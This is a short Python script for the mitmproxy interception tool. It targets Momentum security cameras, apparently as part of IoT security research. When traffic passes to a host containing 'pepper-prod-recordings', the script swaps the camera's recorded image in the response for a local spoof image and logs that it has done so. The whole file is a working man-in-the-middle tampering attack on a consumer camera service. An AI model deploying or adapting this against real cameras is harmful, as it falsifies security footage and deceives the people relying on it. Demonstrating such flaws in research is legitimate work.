"""
This script rewrites the image from the Momentum Cameras
"""
from mitmproxy import http, ctx
import os

def response(flow: http.HTTPFlow) -> None:
    if "pepper-prod-recordings" in flow.request.pretty_host:
        spoof =  open('images/momentum-spoof.jpg','rb').read()
        flow.response.content=spoof
        ctx.log.alert("[Momentum] <Spoofed Camera Image>")

